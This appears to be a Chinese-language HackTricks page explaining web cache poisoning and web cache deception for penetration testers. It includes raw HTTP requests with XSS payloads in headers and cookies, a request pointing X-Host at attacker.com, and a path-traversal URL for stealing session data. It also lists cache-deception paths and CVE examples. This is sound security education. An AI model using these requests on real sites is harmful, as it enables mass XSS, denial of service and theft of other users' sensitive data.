# 缓存毒化和缓存欺骗

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用世界上**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 区别

> **Web缓存毒化和Web缓存欺骗有何区别？**
>
> * 在**Web缓存毒化**中，攻击者导致应用程序在缓存中存储一些恶意内容，并且这些内容从缓存中提供给其他应用程序用户。
> * 在**Web缓存欺骗**中，攻击者导致应用程序在缓存中存储属于另一个用户的一些敏感内容，然后攻击者从缓存中检索这些内容。

## 缓存毒化

缓存毒化旨在操纵客户端缓存，以强制客户端加载意外、部分或受攻击者控制的资源。受影响页面的流行程度决定了影响的程度，因为受污染的响应仅提供给在缓存污染期间访问页面的用户。

执行缓存毒化攻击涉及几个步骤：

1. **识别无键输入**：这些是虽然不是请求缓存所必需的参数，但可以改变服务器返回的响应。识别这些输入至关重要，因为它们可以被利用来操纵缓存。
2. **利用无键输入**：在识别无键输入后，下一步涉及弄清如何滥用这些参数，以使服务器的响应以有利于攻击者的方式进行修改。
3. **确保毒化响应被缓存**：最后一步是确保操纵的响应存储在缓存中。这样，任何在缓存被毒化时访问受影响页面的用户都将收到受污染的响应。

### 发现：检查HTTP头

通常，当响应被**存储在缓存中**时，会有一个**指示的头部**，您可以在此帖子中查看应该注意的头部：[**HTTP缓存头部**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers)。

### 发现：缓存400状态码

如果您认为响应被存储在缓存中，可以尝试**发送带有错误头部的请求**，应该会收到**状态码400**的响应。然后尝试正常访问请求，如果**响应是400状态码**，则表示存在漏洞（甚至可以执行DoS攻击）。\
一个配置不当的头部可能只是`\:`作为头部。\
_请注意，有时这些类型的状态码不会被缓存，因此此测试将无效。_

### 发现：识别和评估无键输入

您可以使用[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)来**暴力破解可能会改变页面响应的参数和头部**。例如，页面可能正在使用头部`X-Forwarded-For`来指示客户端从那里加载脚本：
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### 引发后端服务器的有害响应

通过识别的参数/标头，检查它是如何被**清理**以及它是如何**被反映**或影响标头响应的。您能否以任何方式滥用它（执行 XSS 或加载由您控制的 JS 代码？执行 DoS？...）

### 获取响应缓存

一旦您**确定**了可以滥用的**页面**，要使用的**参数**/**标头**以及如何**滥用**它，您需要将页面缓存。取决于您尝试缓存的资源，这可能需要一些时间，您可能需要尝试几秒钟。\
响应中的标头 **`X-Cache`** 可能非常有用，因为当请求未被缓存时，它可能具有值 **`miss`**，而当它被缓存时则为 **`hit`**。\
标头 **`Cache-Control`** 也很有趣，可以知道资源是否被缓存，下次资源将再次被缓存的时间是什么时候：`Cache-Control: public, max-age=1800`\
另一个有趣的标头是 **`Vary`**。此标头通常用于**指示其他标头**，即使它们通常不是关键的，也会被视为**缓存键**的一部分。因此，如果用户知道受害者的 `User-Agent`，他可以为使用该特定 `User-Agent` 的用户毒害缓存。\
与缓存相关的另一个标头是 **`Age`**。它定义了对象在代理缓存中存在的秒数。

在缓存请求时，要**小心使用标头**，因为其中一些可能会**意外使用**为**关键**，受害者将需要使用相同的标头。始终使用**不同的浏览器**测试缓存投毒以检查是否有效。

## 利用示例

### 最简单的示例

像 `X-Forwarded-For` 这样的标头在响应中未经过清理地反映出来。\
您可以发送基本的 XSS 负载并毒害缓存，因此每个访问该页面的人都将受到 XSS 攻击：
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
### 使用Web缓存欺骗来利用处理Cookie的漏洞

Cookie也可能会在页面的响应中反映出来。如果您可以滥用它来引发跨站脚本攻击，那么您可能能够利用恶意缓存响应中加载的多个客户端中的XSS。
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
### 利用路径遍历进行缓存欺骗以窃取 API 密钥 <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**这篇文章解释了**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) 如何通过类似 `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` 的 URL 来窃取 OpenAI API 密钥，因为任何匹配 `/share/*` 的内容都会被缓存，而 Cloudflare 在请求到达 Web 服务器时并未对 URL 进行规范化。

### 利用多个标头来利用 Web 缓存欺骗漏洞 <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

有时，您需要**利用多个未加密的输入**来滥用缓存。例如，如果您将 `X-Forwarded-Host` 设置为您控制的域，并将 `X-Forwarded-Scheme` 设置为 `http`，**如果**服务器将所有**HTTP**请求**转发到 HTTPS**，并使用标头 `X-Forwarded-Scheme` 作为重定向的域名，您可以通过重定向控制页面指向的位置。
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### 利用有限的 `Vary` 头部

如果你发现 **`X-Host`** 头部被用作**域名来加载一个JS资源**，但响应中的 **`Vary`** 头部指示了 **`User-Agent`**。那么，你需要找到一种方法来窃取受害者的用户代理，并使用该用户代理来操纵缓存：
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### 利用 HTTP 请求串改进行 HTTP 缓存投毒攻击

了解如何通过滥用 [HTTP 请求串改进行缓存投毒攻击](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning)。

### Web 缓存投毒的自动化测试

[Web 缓存漏洞扫描器](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)可用于自动测试 Web 缓存投毒。它支持许多不同的技术，并且高度可定制化。

示例用法：`wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 轻松构建并 **自动化** 使用全球 **最先进** 的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 可被攻击的示例

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS 转发了 URL 中的片段而没有剥离它，并且仅使用主机、路径和查询生成缓存密钥（忽略片段）。因此，请求 `/#/../?r=javascript:alert(1)` 被发送到后端作为 `/#/../?r=javascript:alert(1)`，缓存密钥中不包含有效载荷，只有主机、路径和查询。

### GitHub CP-DoS

在内容类型标头中发送错误值会触发 405 缓存响应。缓存密钥包含了 cookie，因此只能攻击未经授权的用户。

### GitLab + GCP CP-DoS

GitLab 使用 GCP 存储静态内容。**GCP 存储桶** 支持 **头部 `x-http-method-override`**。因此，可以发送头部 `x-http-method-override: HEAD` 并投毒缓存以返回空响应主体。它还可以支持方法 `PURGE`。

### Rack Middleware（Ruby on Rails）

在 Ruby on Rails 应用程序中，经常使用 Rack 中间件。Rack 代码的目的是获取 **`x-forwarded-scheme`** 标头的值并将其设置为请求的方案。当发送标头 `x-forwarded-scheme: http` 时，会发生到相同位置的 301 重定向，可能导致对该资源的拒绝服务（DoS）。此外，应用程序可能会识别 `X-forwarded-host` 标头并将用户重定向到指定的主机。这种行为可能导致从攻击者服务器加载 JavaScript 文件，存在安全风险。

### 403 和存储桶

Cloudflare 以前缓存 403 响应。尝试使用不正确的授权标头访问 S3 或 Azure 存储 Blob 会导致缓存的 403 响应。尽管 Cloudflare 已停止缓存 403 响应，但这种行为可能仍存在于其他代理服务中。

### 注入键参数

缓存通常在缓存密钥中包含特定的 GET 参数。例如，Fastly 的 Varnish 在请求中缓存了 `size` 参数。但是，如果还使用了参数的 URL 编码版本（例如，`siz%65`）并陦入了错误值，缓存密钥将使用正确的 `size` 参数构建。然而，后端会处理 URL 编码参数中的值。对第二个 `size` 参数进行 URL 编码会导致缓存中省略该参数，但后端会使用它。将此参数赋值为 0 会导致可缓存的 400 Bad Request 错误。

### 用户代理规则

一些开发人员会阻止与高流量工具（如 FFUF 或 Nuclei）匹配的用户代理的请求，以管理服务器负载。具有讽刺意味的是，这种方法可能会引入缓存投毒和 DoS 等漏洞。

### 非法标头字段

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) 指定了标头名称中可接受的字符。标头包含超出指定 **tchar** 范围的字符应该理想情况下触发 400 Bad Request 响应。实际上，服务器并不总是遵循这一标准。一个值得注意的例子是 Akamai，它会转发带有无效字符的标头并缓存任何 400 错误，只要不存在 `cache-control` 标头。发现了一个可利用的模式，发送带有非法字符的标头，例如 `\`，会导致可缓存的 400 Bad Request 错误。

### 查找新标头

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## 缓存欺骗

缓存欺骗的目标是使客户端**加载将由缓存保存的资源及其敏感信息**。

首先请注意，例如 `.css`、`.js`、`.png` 等**扩展名**通常被**配置**为**保存**在**缓存中**。因此，如果访问 `www.example.com/profile.php/nonexistent.js`，缓存可能会存储响应，因为它看到了 `.js` **扩展名**。但是，如果**应用程序**正在**重放**存储在 _www.example.com/profile.php_ 中的**敏感**用户内容，您可以从其他用户那里**窃取**这些内容。

其他要测试的内容：

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _使用较少人知道的扩展名，如_ `.avif`

另一个非常明显的例子可以在这篇文章中找到：[https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)。\
在这个例子中，解释了如果加载一个不存在的页面，如 _http://www.example.com/home.php/non-existent.css_，将返回 _http://www.example.com/home.php_ 的内容（**带有用户的敏感信息**），并且缓存服务器将保存结果。\
然后，**攻击者**可以在自己的浏览器中访问 _http://www.example.com/home.php/non-existent.css_ 并观察之前访问过的用户的**机密信息**。

请注意，**缓存代理**应该根据文件的扩展名（_.css_）而不是根据内容类型来**配置**缓存文件。在示例中，_http://www.example.com/home.php/non-existent.css_ 将具有 `text/html` 内容类型，而不是预期的 `text/css` MIME 类型（这是 _.css_ 文件的预期类型）。

了解如何通过[滥用 HTTP 请求串改进行缓存欺骗攻击](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception)。

## 自动化工具

* [**toxicache**](https://github.com/xhzeem/toxicache)：Golang 扫描器，用于在 URL 列表中查找 Web 缓存投毒漏洞并测试多种注入技术。

## 参考资料

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 轻松构建并 **自动化** 使用全球 **最先进** 的社区工具。\
立即获取访问权限：
{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
